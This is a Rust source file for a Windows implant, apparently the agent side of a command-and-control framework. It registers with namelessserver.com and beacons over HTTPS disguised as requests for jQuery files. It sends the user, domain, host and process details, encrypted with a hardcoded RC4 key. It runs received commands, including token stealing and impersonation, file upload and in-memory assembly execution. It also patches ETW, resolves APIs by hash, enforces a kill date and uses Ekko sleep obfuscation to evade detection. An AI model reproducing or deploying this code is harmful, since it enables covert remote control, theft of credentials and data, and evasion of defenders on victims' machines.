pub mod utils;
pub mod commands;
mod ekko;
mod types;
use chrono::{Local, NaiveDate};
use std::time::{SystemTime, UNIX_EPOCH};
use std::io;
use std::env;
use std::{thread, time::Duration};
use crypto::symmetriccipher::SynchronousStreamCipher;
use std::process::exit;
use crate::commands::ls::ls;
use crate::commands::exec_ass::exec_ass;
use crate::commands::getenv::get_env;
use crate::commands::cat::cat;
use crate::commands::ps::ps;
use crate::commands::upload::upload;
use crate::commands::token_manipulation::*;
use crate::utils::Pe::PeGetFuncEat;
use crate::utils::Peb::PebGetModule;
use core::ptr::null_mut;
use core::ffi::c_void;
use crate::utils::etw_patch::etw_patch;

fn is_wow64() -> bool {
    if std::mem::size_of::<usize>() == 4 {
        return false;
    }

    return true;
}

fn generate_random_8_digit_number() -> u32 {
    let current_time = SystemTime::now().duration_since(UNIX_EPOCH).expect("");
    let seed = current_time.as_secs() as u32;

    let mut random_number = seed;
    random_number ^= random_number.wrapping_shl(13);
    random_number ^= random_number.wrapping_shr(17);
    random_number ^= random_number.wrapping_shl(5);

    let min_number = 1_000_000;
    let max_number = 99_999_999;
    random_number = random_number % (max_number - min_number) + min_number;

    random_number
}

fn generate_random_number_between_1_and_30() -> u32 {
    let current_time = SystemTime::now().duration_since(UNIX_EPOCH).expect("");
    let seed = current_time.as_secs() as u32;

    let mut random_number = seed;
    random_number ^= random_number.wrapping_shl(13);
    random_number ^= random_number.wrapping_shr(17);
    random_number ^= random_number.wrapping_shl(5);

    random_number = random_number % 30 + 1;

    random_number
}

fn command_handler(command_plus_id: String, dn_InternetOpenA: types::InternetOpenA, dn_InternetConnectA: types::InternetConnectA, dn_HttpOpenRequestA: types::HttpOpenRequestA, dn_HttpSendRequestA: types::HttpSendRequestA, dn_InternetReadFile: types::InternetReadFile, dn_InternetCloseHandle: types::InternetCloseHandle, dn_InternetSetOptionA: types::InternetSetOptionA, dn_HttpAddRequestHeadersA: types::HttpAddRequestHeadersA, dn_HttpQueryInfoA: types::HttpQueryInfoA)-> () {

    let parts: Vec<&str> = command_plus_id.split(':').collect();

    let b64_dec = base64::decode(parts[1].as_bytes()).unwrap();
    
    let command_str = String::from_utf8_lossy(&b64_dec).to_string();

    let mut command_parts = command_str.split_whitespace();
    let command = command_parts.next().unwrap_or("");
    let command_args: Vec<&str> = command_parts.collect();

    // println!("Task ID: {}", parts[0]);
    // println!("Command: {}", command);
    // println!("Command args: {:?}", command_args); 

    let mut cmd_res: String = parts[0].to_string();
    cmd_res.push_str(obfstr::obfstr!(":"));
    
if  command.contains(obfstr::obfstr!("ls")){
        cmd_res.push_str(&base64::encode(ls(command_args)));
    } 
    else if  command.contains(obfstr::obfstr!("getenv")){
        cmd_res.push_str(&base64::encode(get_env()));
    }
    else if  command.contains(obfstr::obfstr!("exit")){
        exit(0);
    }
    else if  command.contains(obfstr::obfstr!("cat")){
        cmd_res.push_str(&cat(command_args));
    }
    else if  command.contains(obfstr::obfstr!("ps")){ 
        cmd_res.push_str(&base64::encode(ps()));
    }
    else if  command.contains(obfstr::obfstr!("upload")){
        cmd_res.push_str(&base64::encode(upload(command_args)));
    }
    else if command.contains(obfstr::obfstr!("revtoself")){
        cmd_res.push_str(&base64::encode(revert_to_self()))
    }
    else if command.contains(obfstr::obfstr!("maketoken")){
        cmd_res.push_str(&base64::encode(make_token(command_args)))
    }
    else if command.contains(obfstr::obfstr!("stealtoken")){
        cmd_res.push_str(&base64::encode(steal_token(command_args)))
    }
    else if command.contains(obfstr::obfstr!("exec-assembly")){
        cmd_res.push_str(&base64::encode(exec_ass(command_args)))
    }

    let mut cipher = crypto::rc4::Rc4::new("I_AM_A_KEY".as_bytes());
    let mut enc_cmd = vec![0u8; cmd_res.as_bytes().len()];
    cipher.process(&cmd_res.as_bytes(),  &mut enc_cmd);

    let resp_path = obfstr::obfstr!("jquery.js\0").to_string();

    postReq(&resp_path, &enc_cmd, dn_InternetOpenA, dn_InternetConnectA, dn_HttpOpenRequestA, dn_HttpSendRequestA, dn_InternetReadFile, dn_InternetCloseHandle, dn_InternetSetOptionA, dn_HttpAddRequestHeadersA, dn_HttpQueryInfoA);
}

fn postReq(path: &str, data: &[u8], dn_InternetOpenA: types::InternetOpenA, dn_InternetConnectA: types::InternetConnectA, dn_HttpOpenRequestA: types::HttpOpenRequestA, dn_HttpSendRequestA: types::HttpSendRequestA, dn_InternetReadFile: types::InternetReadFile, dn_InternetCloseHandle: types::InternetCloseHandle, dn_InternetSetOptionA: types::InternetSetOptionA, dn_HttpAddRequestHeadersA: types::HttpAddRequestHeadersA, dn_HttpQueryInfoA: types::HttpQueryInfoA) -> io::Result<()>{

    let dst_port = 443;
    let mut buffer: Vec<u8> = Vec::new();
    let mut buffer_for_size = vec![0;8];
    let mut buffer_for_statuscode = vec![0;8];
    let sizeOfCookie2: u32 = 8;
    let sizeOfCookie: u32 = 8;
    let sizeOfdwFlags = 4;
    let mut dwBytesRead : u32 = 0;

    unsafe {
        let hSession: types::HINTERNET = dn_InternetOpenA(obfstr::obfstr!("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1474.0\0").as_ptr(), 0, null_mut(), null_mut(), 0);

        let hConnect: types::HINTERNET = dn_InternetConnectA(hSession, obfstr::obfstr!("namelessserver.com\0").as_ptr(), dst_port, null_mut(), null_mut(), 3, 0, 0);

        let hHttpFile: types::HINTERNET = dn_HttpOpenRequestA(hConnect, obfstr::obfstr!("POST\0").as_ptr(), path.as_ptr(), null_mut(), null_mut(), null_mut(), 0x00800000, 0);


        dn_HttpSendRequestA(hHttpFile, null_mut(), 0, data.as_ptr() as *const c_void, data.len() as u32);
        dn_HttpQueryInfoA(hHttpFile, 5, buffer_for_size.as_mut_ptr(), &sizeOfCookie2, null_mut());
        dn_HttpQueryInfoA(hHttpFile, 19, buffer_for_statuscode.as_mut_ptr(), &sizeOfCookie, null_mut());
        let len: u32 = String::from_utf8_lossy(&buffer_for_size).into_owned().trim_matches(char::from(0)).parse().unwrap_or(3);
        let status_code: u32 = String::from_utf8_lossy(&buffer_for_statuscode).into_owned().trim_matches(char::from(0)).parse().unwrap_or(3);

        buffer.resize(len as usize, 0);
        dn_InternetReadFile(hHttpFile, buffer.as_mut_ptr(), len, &mut dwBytesRead);

        dn_InternetCloseHandle(hHttpFile);
        dn_InternetCloseHandle(hConnect);
        dn_InternetCloseHandle(hSession);
        
        if path.contains(obfstr::obfstr!("jquery-3.6.3.min.js")) && status_code == 200{

            if len != 0 {

                let mut cipher = crypto::rc4::Rc4::new("I_AM_A_KEY".as_bytes());
    
                let are_bytes_null = buffer.iter().take(8).all(|&byte| byte == 0);

                if are_bytes_null != true { // and len == 8
                    let mut output_vec = vec![0u8; len as usize];
                    cipher.process(&buffer[..],  &mut output_vec[..]);
                    command_handler(String::from_utf8(output_vec).unwrap(), dn_InternetOpenA, dn_InternetConnectA, dn_HttpOpenRequestA, dn_HttpSendRequestA, dn_InternetReadFile, dn_InternetCloseHandle, dn_InternetSetOptionA, dn_HttpAddRequestHeadersA, dn_HttpQueryInfoA);
                }
            }
        }
    
        if status_code == 200 {
            Ok(())
        } else {
            Err(io::Error::new(io::ErrorKind::Other, "Not 200"))
        }
    }
}

fn is_kill_date_passed(kill_date: &str) -> bool {
    let kill_date_parsed = NaiveDate::parse_from_str(kill_date, "%Y-%m-%d");

    match kill_date_parsed {
        Ok(kill_date) => {
            let current_date = Local::today().naive_local();
            current_date > kill_date
        }
        Err(_) => {
            false
        }
    }
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
pub extern "C" fn DiagnosisCheck () {
    let kill_date = obfstr::obfstr!("2025-10-31").to_string();

    if is_kill_date_passed(&kill_date) {
        std::process::exit(1);
    }else {
        etw_patch(1);
        main();
    }
}

fn main() {

    let userName = whoami::username();
    let domainName = env::var(obfstr::obfstr!("USERDOMAIN")).unwrap_or("".to_string());
    let deviceName = whoami::hostname();
    let procNamePath = std::env::current_exe().unwrap();
    let procName = procNamePath.file_name().unwrap().to_str().unwrap();
    let distro = whoami::distro();
    let pid = std::process::id();
    let pidf: String = pid.to_string();
    let naptime = 10;
    let path = obfstr::obfstr!("register\0").to_string();
    let checkinpath = obfstr::obfstr!("jquery-3.6.3.min.js\0").to_string();

    let id_str = generate_random_8_digit_number().to_string();

    let mut data = "{\"".to_owned();
    data.push_str(obfstr::obfstr!("implant_id"));
    data.push_str("\":\"");
    data.push_str(&id_str);
    data.push_str("\",\"");
    data.push_str(obfstr::obfstr!("username"));
    data.push_str("\":\"");
    data.push_str(&userName);
    data.push_str("\",\"");
    data.push_str(obfstr::obfstr!("domain"));
    data.push_str("\":\"");
    data.push_str(&domainName);
    data.push_str("\",\"");
    data.push_str(obfstr::obfstr!("machine"));
    data.push_str("\":\"");
    data.push_str(&deviceName);
    data.push_str("\",\"");
    data.push_str(obfstr::obfstr!("process"));
    data.push_str("\":\"");
    data.push_str(&procName);
    data.push_str("\",\"");
    data.push_str(obfstr::obfstr!("versionOS"));
    data.push_str("\":\"");
    data.push_str(&distro);
    data.push_str("\",\"");
    data.push_str(obfstr::obfstr!("arch"));
    data.push_str("\":\"");
    if is_wow64() == false {
        data.push_str(obfstr::obfstr!("x86"));
    }else{
        data.push_str(obfstr::obfstr!("x64"));
    }
    data.push_str("\",\"");
    data.push_str(obfstr::obfstr!("pid"));
    data.push_str("\":\"");
    data.push_str(&pidf);
    data.push_str("\"}");

    let mut cipher = crypto::rc4::Rc4::new("I_AM_A_KEY".as_bytes());
    let mut enc_implants = vec![0u8; data.as_bytes().len()];
    cipher.process(&data.as_bytes(),  &mut enc_implants);

    unsafe{

        let kernel32_base_address = PebGetModule(0x6ddb9555);
    
        let dn_load_library_a: types::LoadLibraryA = std::mem::transmute(PeGetFuncEat(kernel32_base_address, 0xb7072fdb));
    
        let wininetbase_address = dn_load_library_a(obfstr::obfstr!("wininet.dll\0").as_ptr());
        
        let dn_InternetOpenA: types::InternetOpenA = std::mem::transmute(PeGetFuncEat(wininetbase_address, 0xa7917761));
        let dn_InternetConnectA: types::InternetConnectA = std::mem::transmute(PeGetFuncEat(wininetbase_address, 0xc058d7b9));
        let dn_HttpOpenRequestA: types::HttpOpenRequestA = std::mem::transmute(PeGetFuncEat(wininetbase_address, 0x8b6ddc61));
        let dn_HttpSendRequestA: types::HttpSendRequestA = std::mem::transmute(PeGetFuncEat(wininetbase_address, 0x2bc23839));
        let dn_InternetSetOptionA: types::InternetSetOptionA = std::mem::transmute(PeGetFuncEat(wininetbase_address, 0xdf162934));
        let dn_InternetReadFile: types::InternetReadFile = std::mem::transmute(PeGetFuncEat(wininetbase_address, 0x7766910a));
        let dn_InternetCloseHandle: types::InternetCloseHandle = std::mem::transmute(PeGetFuncEat(wininetbase_address, 0x87a314f0));
        let dn_HttpAddRequestHeadersA: types::HttpAddRequestHeadersA = std::mem::transmute(PeGetFuncEat(wininetbase_address, 0x85c0d14));
        let dn_HttpQueryInfoA: types::HttpQueryInfoA = std::mem::transmute(PeGetFuncEat(wininetbase_address, 0x9df7f348));    
        loop {
            match postReq(&path, &enc_implants, dn_InternetOpenA, dn_InternetConnectA, dn_HttpOpenRequestA, dn_HttpSendRequestA, dn_InternetReadFile, dn_InternetCloseHandle, dn_InternetSetOptionA, dn_HttpAddRequestHeadersA, dn_HttpQueryInfoA){
                Ok(()) => break,
                Err(error) =>
                    thread::sleep(Duration::from_secs(naptime)),
            };
        }

        cipher = crypto::rc4::Rc4::new("I_AM_A_KEY".as_bytes());
        let mut impl_id_check_req = vec![0u8; id_str.as_bytes().len()];
        cipher.process(&id_str.as_bytes(),  &mut impl_id_check_req);

        loop{

            let jit = generate_random_number_between_1_and_30() as u64;
            postReq(&checkinpath, &impl_id_check_req, dn_InternetOpenA, dn_InternetConnectA, dn_HttpOpenRequestA, dn_HttpSendRequestA, dn_InternetReadFile, dn_InternetCloseHandle, dn_InternetSetOptionA, dn_HttpAddRequestHeadersA, dn_HttpQueryInfoA);
            let mut key_buf = "1234567890ABCDEF\0".as_bytes().to_vec();
            ekko::ekko((naptime + jit)*1000, &mut key_buf);
            //thread::sleep(Duration::from_secs(naptime + jit)); //uncomment this and comment the abose 2 lines if you want normal sleep instead of EkkoEx
        }
    }
}
